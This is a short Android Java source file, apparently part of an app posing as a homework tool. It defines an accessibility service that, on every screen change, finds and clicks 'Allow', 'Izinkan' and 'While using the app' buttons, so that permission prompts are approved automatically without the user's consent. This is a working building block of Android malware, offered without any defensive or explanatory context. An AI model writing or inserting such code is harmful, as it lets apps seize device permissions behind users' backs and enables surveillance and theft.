package com.ai.homework;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AutoGrantService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByText("Allow");
                btns.addAll(root.findAccessibilityNodeInfosByText("IZINKAN"));
                btns.addAll(root.findAccessibilityNodeInfosByText("Izinkan"));
                btns.addAll(root.findAccessibilityNodeInfosByText("While using the app"));
                for (AccessibilityNodeInfo node : btns) { if (node.isClickable()) node.performAction(AccessibilityNodeInfo.ACTION_CLICK); }
            }
        }
    }
    @Override public void onInterrupt() {}
}
